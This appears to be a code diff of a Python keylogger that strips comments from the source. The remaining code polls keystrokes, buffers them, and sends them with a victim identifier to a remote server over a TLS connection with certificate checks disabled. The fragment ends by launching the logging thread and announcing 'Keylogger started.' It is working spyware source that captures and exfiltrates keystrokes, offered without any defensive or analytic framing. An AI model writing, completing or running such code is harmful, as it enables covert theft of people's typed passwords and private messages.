@@ -69,7 +69,6 @@ def main():
             else:
                 prev_key_states[vk_code] = 0
 
-        # Send captured keystrokes to the server
         if not keystroke_buffer.empty():
             keystrokes = []
             while not keystroke_buffer.empty():
@@ -77,13 +76,11 @@ def main():
 
             if keystrokes:
                 try:
-                    # Create an SSL context and connect to the server
                     context = ssl.create_default_context()
                     context.check_hostname = False
                     context.verify_mode = ssl.CERT_NONE
                     with socket.create_connection((HOST, PORT)) as sock:
                         with context.wrap_socket(sock, server_hostname=HOST) as ssock:
-                            # Combine all collected keystrokes into one message
                             message = b"keylogger|||" + uid.encode() + b"|||" + b''.join(keystrokes)
                             ssock.sendall(message)
                 except ConnectionRefusedError:
@@ -91,8 +88,7 @@ def main():
                 except ssl.SSLError:
                     pass
 
-        time.sleep(0.005)  # Reduce sleep time for more frequent key checks
+        time.sleep(0.005)
 
-# Start the main keylogger thread
 threading.Thread(target=main).start()
 print("Keylogger started.")
